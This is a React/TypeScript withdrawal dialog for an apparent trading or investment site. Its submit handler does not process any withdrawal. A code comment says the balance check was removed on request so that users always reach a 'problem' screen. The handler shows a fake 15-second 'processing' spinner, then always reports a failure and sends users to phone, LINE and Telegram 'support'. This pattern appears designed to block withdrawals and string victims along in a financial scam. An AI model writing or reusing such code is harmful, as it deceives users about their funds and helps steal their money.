import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { motion, AnimatePresence } from "framer-motion";
import {
  X,
  ArrowUpCircle,
  ChevronRight,
  AlertCircle,
  Loader2,
  CheckCircle2,
} from "lucide-react";
import { supabase } from "../../lib/supabase";
import { depositMethods } from "../../data/depositMethods";
import { SupportContactList } from "./SupportContactList";
import { useLanguage } from "../../contexts/LanguageContext";
import { useAuth } from "../../contexts/AuthContext";
import { UserX } from "lucide-react";

type WithdrawStep = "select" | "form" | "result" | "kyc_required";

interface WithdrawModalProps {
  balance: number;
  onClose: () => void;
}

export const WithdrawModal: React.FC<WithdrawModalProps> = ({
  balance,
  onClose,
}) => {
  const { t, language } = useLanguage();
  const { profile } = useAuth();
  const navigate = useNavigate();
  
  const [step, setStep] = useState<WithdrawStep>(() => {
    return profile?.kyc_status === 'verified' ? "select" : "kyc_required";
  });
  const [selected, setSelected] = useState<(typeof depositMethods)[0] | null>(
    null,
  );
  const [bankName] = useState("");
  const [accountNumber] = useState("");
  const [amount, setAmount] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [amountError, setAmountError] = useState("");
  const [settings, setSettings] = useState({
    phone: "",
    line: "",
    telegram: "",
  });

  useEffect(() => {
    const fetchSettings = async () => {
      const { data } = await supabase
        .from("global_settings")
        .select("*")
        .eq("id", "main")
        .single();
      if (data) {
        setSettings({
          phone: data.contact_phone || "",
          line: data.contact_line || "",
          telegram: data.contact_telegram || "",
        });
      }
    };
    fetchSettings();
  }, []);

  // Handle ESC key to close modal
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") {
        onClose();
      }
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [onClose]);

  const handleSubmit = async () => {
    const num = parseFloat(amount);
    if (!num || num <= 0) {
      setAmountError(language === 'th' ? "กรุณาระบุจำนวนเงินที่ถูกต้อง" : "Please enter a valid amount");
      return;
    }
    // Remove balance check to always proceed to the 'problem' screen as requested
    setAmountError("");
    setSubmitting(true);
    await new Promise((r) => setTimeout(r, 15000));
    setSubmitting(false);
    setStep("result");
  };

  return (
    <AnimatePresence mode="wait">
      {/* ── Step 0: KYC Required ── */}
      {step === "kyc_required" && (
        <motion.div
          key="kyc_required"
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          exit={{ opacity: 0 }}
          className="flex flex-col"
        >
          <div className="p-6 border-b border-white/5 flex items-center justify-between relative bg-slate-900/50">
            <h2 className="text-lg font-black text-white flex items-center gap-2">
               <UserX size={20} className="text-amber-500" />
               {language === 'th' ? "ต้องยืนยันตัวตน (KYC)" : "KYC Verification Required"}
            </h2>
            <button
              onClick={onClose}
              className="p-1 rounded-full hover:bg-white/10 transition-colors text-slate-400 hover:text-white"
            >
              <X size={18} />
            </button>
          </div>

          <div className="p-6">
            <div className="flex flex-col items-center text-center mb-6">
              <div className="w-16 h-16 rounded-full bg-amber-500/10 border border-amber-500/20 flex items-center justify-center mb-4">
                <AlertCircle size={32} className="text-amber-400" />
              </div>
              <p className="text-slate-300 text-sm leading-relaxed mb-4">
                {language === 'th' 
                  ? (<>เพื่อความปลอดภัยของบัญชี กรุณายืนยันตัวตน{" "}
                      <button
                        onClick={() => { onClose(); sessionStorage.setItem("settings_active_tab", "profile"); navigate("/settings"); }}
                        className="text-amber-400 underline underline-offset-2 hover:text-amber-300 font-bold transition-colors cursor-pointer"
                      >(KYC)</button>{" "}
                      ให้เสร็จสมบูรณ์ก่อนทำรายการฝาก-ถอนเงินครับ</>) 
                  : (<>For account security, please complete{" "}
                      <button
                        onClick={() => { onClose(); sessionStorage.setItem("settings_active_tab", "profile"); navigate("/settings"); }}
                        className="text-amber-400 underline underline-offset-2 hover:text-amber-300 font-bold transition-colors cursor-pointer"
                      >KYC verification</button>{" "}
                      before depositing or withdrawing funds.</>)}
              </p>
              <p className="text-slate-500 text-xs font-bold uppercase tracking-widest">
                {language === 'th' ? "สถานะปัจจุบัน:" : "Current Status:"} <span className="text-amber-400">{profile?.kyc_status?.toUpperCase() || 'UNVERIFIED'}</span>
              </p>
            </div>

            <div className="mb-6">
              <SupportContactList settings={settings} />
            </div>

            <button
              onClick={onClose}
              className="w-full py-4 rounded-xl bg-white/10 hover:bg-white/15 text-white font-black text-sm transition-all"
            >
              {t('closeLabel')}
            </button>
          </div>
        </motion.div>
      )}

      {/* ── Step 1: Select Method ── */}
      {step === "select" && (
        <motion.div
          key="select"
          initial={false}
          animate={{ opacity: 1, x: 0 }}
          exit={{ opacity: 0, x: -30 }}
          className="flex flex-col"
        >
          {/* Header */}
          <div className="p-6 border-b border-white/5 flex items-center justify-between relative bg-slate-900/50">
            <div>
              <h2 className="text-lg font-black text-white flex items-center gap-2">
                <ArrowUpCircle size={20} className="text-red-500" />
                {t('withdraw')}
              </h2>
              <p className="text-slate-400 text-[10px] font-bold uppercase tracking-wider mt-0.5">
                {t('selectWithdrawMethod')}
              </p>
            </div>
            <button
              onClick={onClose}
              className="p-1 rounded-full hover:bg-white/10 transition-colors text-slate-400 hover:text-white"
            >
              <X size={18} />
            </button>
          </div>

          {/* Body */}
          <div className="p-6">
            {/* Balance badge */}
            <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-4 mb-6 flex items-center justify-between">
              <span className="text-slate-400 text-xs font-bold uppercase tracking-wider">{t('availableBalanceLabel')}</span>
              <span className="text-white font-black text-lg">
                ${balance.toLocaleString(undefined, { minimumFractionDigits: 2 })}
              </span>
            </div>

            <div className="space-y-3">
              {depositMethods.map((m) => (
                <button
                  key={m.id}
                  onClick={() => {
                    setSelected(m);
                    setStep("form");
                  }}
                  className={`w-full flex items-center justify-between p-4 rounded-2xl bg-gradient-to-tr ${m.color} border ${m.border} hover:border-white/30 transition-all group`}
                >
                  <div className="flex items-center gap-3">
                    <span className="text-2xl">{m.flag}</span>
                    <div className="text-left">
                      <p className="text-white font-bold text-sm">{m.label}</p>
                      <p className="text-slate-400 text-xs">{m.bank}</p>
                    </div>
                  </div>
                  <ChevronRight
                    size={16}
                    className="text-slate-500 group-hover:text-white group-hover:translate-x-1 transition-all"
                  />
                </button>
              ))}
            </div>
          </div>
        </motion.div>
      )}

      {/* ── Step 2: Enter Bank Details ── */}
      {step === "form" && selected && (
        <motion.div
          key="form"
          initial={{ opacity: 0, x: 30 }}
          animate={{ opacity: 1, x: 0 }}
          exit={{ opacity: 0, x: -30 }}
          className="flex flex-col"
        >
          {/* Header */}
          <div className="p-6 border-b border-white/5 flex items-center justify-between relative bg-slate-900/50">
            <button
              onClick={() => setStep("select")}
              className="text-slate-400 hover:text-white text-xs font-bold flex items-center gap-1"
            >
              <ChevronRight size={14} className="rotate-180" /> {t('back')}
            </button>
            <button
              onClick={onClose}
              className="p-1 rounded-full hover:bg-white/10 transition-colors text-slate-400 hover:text-white"
            >
              <X size={18} />
            </button>
          </div>

          {/* Body */}
          <div className="p-6">
            <div className="text-center mb-6">
              <span className="text-3xl">{selected.flag}</span>
              <h2 className="text-lg font-black text-white mt-1">
                {selected.label}
              </h2>
              <p className="text-slate-400 text-xs">{selected.bank}</p>
            </div>

            <div className="space-y-4 mb-6">
              {/* Verified Bank Details */}
              <div className="bg-slate-900 border border-white/10 rounded-xl p-4 flex items-center justify-between">
                <div>
                  <p className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1">{selected.id === "usdt" ? t('network') : t('bankName')}</p>
                  <p className="text-white font-bold text-sm">{profile?.bank_network || 'N/A'}</p>
                  <p className="text-slate-400 text-xs mt-0.5 max-w-[120px] truncate">{profile?.bank_name || ''}</p>
                </div>
                <div className="text-right">
                  <p className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1">{selected.id === "usdt" ? t('walletAddress') : t('accountNumberLabel')}</p>
                  <p className="text-white font-mono text-sm tracking-widest">{profile?.bank_account ? `${profile.bank_account.substring(0, 4)}...${profile.bank_account.slice(-4)}` : 'N/A'}</p>
                  <div className="flex justify-end mt-1">
                    <span className="text-[9px] bg-green-500/20 text-green-500 px-1.5 py-0.5 rounded border border-green-500/20 font-bold uppercase tracking-wider flex items-center gap-1">
                      <CheckCircle2 size={10} /> Verified
                    </span>
                  </div>
                </div>
              </div>

              {/* Amount */}
              <div>
                <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 block ml-1">
                  {t('amountToWithdraw')}
                </label>
                <div className="relative">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 font-bold">
                    $
                  </span>
                  <input
                    type="number"
                    inputMode="decimal"
                    value={amount}
                    onChange={(e) => {
                      setAmount(e.target.value);
                      setAmountError("");
                    }}
                    placeholder="0.00"
                    className="w-full bg-slate-900 border border-white/10 rounded-xl py-4 pl-8 pr-20 text-xl font-black text-white focus:outline-none focus:ring-2 focus:ring-red-500/40 transition-all placeholder:text-slate-700"
                  />
                  <button
                    onClick={() => setAmount(balance.toFixed(2))}
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-[10px] font-black text-red-400 hover:text-red-300 transition-colors"
                  >
                    MAX
                  </button>
                </div>
                <div className="flex gap-2 mt-3">
                  {[100, 500, 1000, 5000].map((v) => (
                    <button
                      key={v}
                      onClick={() => setAmount(v.toString())}
                      className="flex-1 py-2 rounded-lg bg-white/5 text-slate-400 text-[10px] font-black hover:bg-white/10 hover:text-white transition-colors border border-white/5"
                    >
                      ${v.toLocaleString()}
                    </button>
                  ))}
                </div>
                {amountError && (
                  <p className="text-red-400 text-[11px] font-bold mt-2 flex items-center gap-1">
                    <AlertCircle size={12} /> {amountError}
                  </p>
                )}
              </div>
            </div>

            <div className="text-[10px] font-bold uppercase tracking-wide text-amber-400/80 bg-amber-500/10 border border-amber-500/20 rounded-xl p-4 mb-6 leading-relaxed">
              {t('checkDetailsWarning')}
            </div>

            <button
              onClick={handleSubmit}
              disabled={submitting || !amount}
              className="w-full py-4 rounded-xl bg-red-500 hover:bg-red-600 text-white font-black text-lg shadow-xl shadow-red-500/20 transition-all active:scale-95 disabled:opacity-50 flex items-center justify-center gap-2"
            >
              {submitting ? (
                <Loader2 size={20} className="animate-spin" />
              ) : (
                <ArrowUpCircle size={20} />
              )}
              {submitting ? t('processingWithdrawal') : t('confirmWithdrawal')}
            </button>
          </div>
        </motion.div>
      )}

      {/* ── Step 3: Problem + Support ── */}
      {step === "result" && (
        <motion.div
          key="result"
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          exit={{ opacity: 0 }}
          className="flex flex-col"
        >
          {/* Header */}
          <div className="p-6 border-b border-white/5 flex items-center justify-between relative bg-slate-900/50">
            <h2 className="text-lg font-black text-white flex items-center gap-2">
              <AlertCircle size={20} className="text-red-500" />
              {t('withdrawProblemTitle')}
            </h2>
            <button
              onClick={onClose}
              className="p-1 rounded-full hover:bg-white/10 transition-colors text-slate-400 hover:text-white"
            >
              <X size={18} />
            </button>
          </div>

          {/* Body */}
          <div className="p-6">
            <div className="flex flex-col items-center text-center mb-6">
              <div className="w-16 h-16 rounded-full bg-red-500/10 border border-red-500/20 flex items-center justify-center mb-4">
                <AlertCircle size={32} className="text-red-400" />
              </div>
              <p className="text-slate-400 text-sm leading-relaxed whitespace-pre-line">
                {t('withdrawProblemDesc')}
              </p>
            </div>

            {/* Withdraw summary */}
            <div className="bg-white/5 border border-white/5 rounded-xl p-4 mb-6 space-y-3">
              <div className="flex justify-between text-[11px] font-bold uppercase tracking-wider">
                <span className="text-slate-500">{t('currency')}</span>
                <span className="text-white">{selected?.label}</span>
              </div>
              <div className="flex justify-between text-[11px] font-bold uppercase tracking-wider">
                <span className="text-slate-500">
                  {selected?.id === "usdt" ? "Wallet" : t('bankName')}
                </span>
                <span className="text-white">{bankName}</span>
              </div>
              <div className="flex justify-between text-[11px] font-bold uppercase tracking-wider">
                <span className="text-slate-500">{t('accountNumberLabel')}</span>
                <span className="text-white font-mono">
                  {accountNumber}
                </span>
              </div>
              <div className="flex justify-between text-[13px] border-t border-white/5 pt-3 mt-1">
                <span className="text-slate-400 font-bold uppercase tracking-wider">{t('amount')}</span>
                <span className="text-red-500 font-black">
                  $
                  {parseFloat(amount).toLocaleString(undefined, {
                    minimumFractionDigits: 2,
                  })}
                </span>
              </div>
            </div>

            <div className="mb-6">
              <SupportContactList settings={settings} />
            </div>

            <button
              onClick={onClose}
              className="w-full py-4 rounded-xl bg-white/10 hover:bg-white/15 text-white font-black text-base transition-all"
            >
              {t('closeLabel')}
            </button>
          </div>
        </motion.div>
      )}
    </AnimatePresence>
  );
};
